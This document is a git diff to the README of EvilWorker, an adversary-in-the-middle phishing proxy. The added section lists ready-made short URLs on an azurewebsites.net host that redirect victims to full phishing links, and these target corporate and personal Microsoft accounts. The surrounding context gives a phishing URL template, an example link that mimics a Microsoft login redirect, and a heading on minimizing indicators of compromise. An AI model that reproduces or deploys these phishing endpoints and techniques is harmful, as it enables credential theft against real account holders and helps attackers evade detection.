@@ -74,7 +74,22 @@ http(s)://$PHISHING_DOMAIN_NAME$PROXY_ENTRY_POINT&$PHISHED_URL_PARAMETER=$LEGITI
 https://ahb-test.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
 ```
 
-If the malicious proxy server fails to proxy the victim’s HTTP traffic, it is recommended to read the full [article](https://medium.com/@ahaz1701/evilworker-da94ae171249) to understand the specific cases that may cause issues and how to resolve them.
+### Short URLs
+
+For convenience, EvilWorker now includes short URL endpoints that automatically redirect to the full phishing URLs:
+
+**Corporate Accounts:**
+- `https://evilworker-aitm-2025.azurewebsites.net/c`
+- `https://evilworker-aitm-2025.azurewebsites.net/corp`
+- `https://evilworker-aitm-2025.azurewebsites.net/corporate`
+
+**Personal Accounts:**
+- `https://evilworker-aitm-2025.azurewebsites.net/p`
+- `https://evilworker-aitm-2025.azurewebsites.net/personal`
+
+These short URLs automatically redirect to the full phishing URLs with all necessary parameters.
+
+If the malicious proxy server fails to proxy the victim's HTTP traffic, it is recommended to read the full [article](https://medium.com/@ahaz1701/evilworker-da94ae171249) to understand the specific cases that may cause issues and how to resolve them.
 
 ### Minimize the IOCs
 
